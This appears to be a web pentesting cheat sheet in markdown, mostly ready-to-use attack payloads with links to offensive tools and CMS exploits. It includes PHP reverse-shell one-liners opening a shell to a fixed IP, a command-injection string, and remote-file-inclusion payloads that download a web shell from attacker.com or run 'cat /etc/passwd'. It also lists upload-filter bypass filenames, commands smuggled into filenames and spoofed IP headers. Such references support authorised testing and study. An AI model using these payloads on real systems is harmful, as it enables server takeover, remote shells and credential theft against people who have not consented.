# WEB

Shells
------

* Reverse shell one-liners:
```
<?php $s=fsockopen(\"192.168.16.124\",1234);exec("sh<%263>%263 2>%263");?>  
<?php $s=fsockopen("192.168.16.124",1234);exec("sh<&3>&3 2>&3") ;?>
```

* [Weevely](https://github.com/epinna/weevely3/) - great command line web shell with good features


XSRF (Cross-site Request Forgery)
---------------------------------

* [CSurfer](https://github.com/asaafan/CSurfer/) - CSRF guard hiding extension for Burp
* [CSRF-Request-Builder](https://github.com/TheRook/CSRF-Request-Builder/) - tool for testing CSRF against web services


Command Injection
-----------------

* Try to use pipe, ampersands, double ampersands, colon: `1 | uname -a & users & id`


File Inclusion
==============

Local File Inclusion
--------------------

Example: `http://localhost/dvwa/vulnerabilities/fi/?page=include.php`  

Remote File Inclusion
---------------------

Example: `http://localhost/dvwa/vulnerabilities/fi/?page=http://google.com/robots.txt`  
* [PHP File Inclusion Overview](https://websec.wordpress.com/2010/02/22/exploiting-php-file-inclusion-overview/)  
* [Uniscan](https://sourceforge.net/projects/uniscan/) - simple RFI, LFI and RCE vulnerability scanner  
* [rfishell](https://github.com/superkojiman/rfishell) - provide a shell-like interface when exploiting RFI vulns  

Exploitation examples:  
```
http://victim.com/i_dont_exist.php?code=<?php file_put_contents("shell.php", file_get_contents("http://attacker.com/shell.txt")) ?>
http://10.0.17.147/wordpress/wp-content/plugins/mygallery/myfunctions/mygallerybrowser.php?myPath=http://10.0.17.145/test/test.txt? //test.txt contains <?php print system("cat /etc/passwd"); ?>
```
When appending questionmark to the end of the payload, the remainder of the local PHP code is treated as a parameter to the RFI included code. Also try multiple questionmarks.  
Metasploit Web Delivery could also be useful in order to get an interactive shell.


File Upload
-----------

* Image upload restrictions [bypass](http://hackers2devnull.blogspot.lt/2013/05/how-to-shell-server-via-image-upload.html):

```
shell.jpg.php (satisfies as check for jpg only)
shell.jpg.PhP (obfuscation)
shell.php;.jpg (sometimes can ignore whats after ";")
shell.php%0delete0.jpg (the infamous NULL byte which comments out trailing text, remove the word delete so the zeros join together, blogspot strips this string!)
shell.php.test (defaults to first recognised extension ignoring "test")
shell.php.xxxjpg (still ends in .jpg, but not recognised extension so will default to php!)
.phtml (a commonly used php parsed extension often forgotten about!)
.php3/.php4/.php5 (valid PHP extensions possibly left out of extension blacklists)
```

* [evilarc](https://github.com/ptoomey3/evilarc) - creates zip files with dir traversal characters in their embedded path

* Uploading `.htaccess` and remapping filetypes
* Shellcode in filename:
```
.png; ls -la;
; whoami; .png
```

PHP-Specific
------------

* [IonCube V8.2 + PHP Auto - Fixer Decoder](http://phpdecode.blogspot.co.at/)


XXE (XML External Entity Injection)
-----------------------------------

* [Preventing XXE in PHP](https://websec.io/2012/08/27/Preventing-XEE-in-PHP.html)

SSL
---

* [SSL Checklist for Pentesters - the Manual Cheatsheet](http://www.exploresecurity.com/wp-content/uploads/custom/SSL_manual_cheatsheet.html)


IP Spoofing
-----------

Accept: */*
x-forwarded-for: 127.0.0.1  
x-remote-IP: 127.0.0.1  
x-originating-IP: 127.0.01  
x-remote-addr: 127.0.0.1  
x-remote-ip: 127.0.0.1  
x-forwarded-for 127.0.0.1  

Sometimes referer needs to be deleted in the request.

Nikto
-----

Simple scan:

```
perl nikto.pl -host http://www.example.com
```

Browser-Related
---------------

* [Chrome "No Web Security"](https://bugs.chromium.org/p/chromium/issues/detail?id=575690) - Chrome can be started with less web security mode using flag "--disable-web-security"  
* Pentesting plugins: [Firebug](http://getfirebug.com/), [Cookies Manager+](https://addons.mozilla.org/en-US/firefox/addon/cookies-manager-plus/), [FoxyProxy](https://getfoxyproxy.org/), [Tamper Data](https://addons.mozilla.org/en-US/firefox/addon/tamper-data/), [FileStorage Plus!](https://addons.mozilla.org/de/firefox/addon/firestorage-plus/), [NoScript Security Suite](https://addons.mozilla.org/en-US/firefox/addon/noscript/), [HackBar](https://addons.mozilla.org/en-US/firefox/addon/hackbar/)  


CMS-Specific
============

Drupal
------

* [Attacking Drupal](http://www.slideshare.net/heinzarelli/attacking-drupal)
* [DPScan](http://www.ehacking.net/2012/02/dpscan-drupal-security-scanner-tutorial.html)
* [Drupal by Mad Irish](http://www.madirish.net/tag/drupal) - good resource on Drupal vulns
* Find out which version: `domain.com/changelog.txt`

Liferay
-------

* [LiferayScan](https://github.com/bcoles/LiferayScan) - simple remote scanner for Liferay Portal
* [Hacking Liferay CMS](http://realpentesting.blogspot.co.at/2013/01/hacking-liferay-cms.html) - version 6.06
* [Liferay Portal Security Research](http://www.procheckup.com/media/194945/liferay.pdf) - version 6.05
* [Liferay Portlet Shell](https://www.insinuator.net/tag/liferay/)
* [Liferay 6.1 can be compromised in its default configuration](http://seclists.org/bugtraq/2012/Apr/151)
* [Liferay Portal 7.0.x <= 7.0.2 - Pre-Auth RCE Exploit](http://0day.today/exploit/23043)
* [Hacking LifeRay CMS](http://realpentesting.blogspot.co.at/2013/01/hacking-liferay-cms.html)
* [Hacking Liferay](http://blog.etapix.com/2013/02/hacking-liferay-securing-against-online.html)
